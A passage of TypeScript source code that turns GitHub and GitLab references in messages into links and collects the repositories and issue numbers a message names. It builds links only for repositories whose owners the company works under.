  const base = vendor === "github" ? github : gitlab;
  if (base === null) return { vendor, href: null };
  // SOMEBODY ELSE'S REPOSITORY is its mark and its words, linked nowhere: a
  // link is built only to an owner the company works under ([ownsOwner]).
  const host = hosts.find((h) => h.kind === vendor)!;
  if (!ownsOwner(host, segments[0]!)) return { vendor, href: null };
  const tail =
    vendor === "github"
      ? sep === "@"
        ? `commit/${id}`
        : `issues/${id}`
      : sep === "@"
        ? `-/commit/${id}`
        : sep === "!"
          ? `-/merge_requests/${id}`
          : `-/issues/${id}`;
  const encoded = segmentsOf(segments);
  return { vendor, href: encoded === null ? null : safeHref(`${base}/${encoded}/${tail}`) };
}

/** The code host whose `owners` hold `owner` (any case), or null for none or two. */
function ownerHost(owner: string, hosts: readonly LinkHost[]): LinkHost | null {
  const name = owner.toLowerCase();
  const holding = hosts.filter(
    (h) => (h.kind === "github" || h.kind === "gitlab") && (h.owners ?? []).includes(name),
  );
  return holding.length === 1 ? holding[0]! : null;
}

/**
 * Where a bare repository points (rule 3a): its owner's code host, at the
 * repository's page. Null where two hosts name the owner, which could be
 * either, so the words stay words.
 */
export function repositoryTarget(
  owner: string,
  repo: string,
  hosts: readonly LinkHost[],
): ReferenceTarget | null {
  const host = ownerHost(owner, hosts);
  if (host === null) return null;
  const path = segmentsOf([owner, repo]);
  const href = path === null ? null : safeHref(`${host.url}/${path}`);
  return { vendor: host.kind as "github" | "gitlab", href };
}

/** Every owner the code hosts name, in lower case: what [inlineTokens] reads rule 3a by. */
export function codeHostOwners(hosts: readonly LinkHost[]): ReadonlySet<string> {
  const owners = hosts.flatMap((h) =>
    h.kind === "github" || h.kind === "gitlab" ? (h.owners ?? []) : [],
  );
  return owners.length === 0 ? NO_OWNERS : new Set(owners.map((o) => o.toLowerCase()));
}

/**
 * What a message names (rule 3b): every reference, repository and code host
 * address its texts spell, with the issue and pull request numbers under
 * each repository. A message is the texts one person reads as one thing: an
 * ask's question, context, recommendation and options, one comment, one
 * page.
 *
 * READ FROM THE WORDS ALONE, at the boundaries every other token is: a
 * number under two repositories, or a message naming two, places no bare
 * number anywhere, rather than guessing which one a writer meant.
 */
export function messageScope(texts: readonly string[], hosts: readonly LinkHost[]): MessageScope {
  const owners = codeHostOwners(hosts);
  const numbers = new Map<string, Set<string>>();
  const repositories = new Set<string>();
  const name = (path: string, number: string | null) => {
    const repo = path.toLowerCase();
    repositories.add(repo);
    if (number === null) return;
    const under = numbers.get(number) ?? new Set<string>();
    under.add(repo);
    numbers.set(number, under);
  };
  for (const text of texts) {
    for (const token of inlineTokens(text, owners)) {
      if (token.kind === "reference") name(token.path, token.sep === "#" ? token.id : null);
      else if (token.kind === "repository") name(`${token.owner}/${token.repo}`, null);
      else if (token.kind === "address") {
        const place = describeLink(token.href, hosts)?.place;
        if (place) name(place.path, place.number);
      }
    }
  }
  return numbers.size === 0 && repositories.size === 0 ? NO_SCOPE : { numbers, repositories };
}
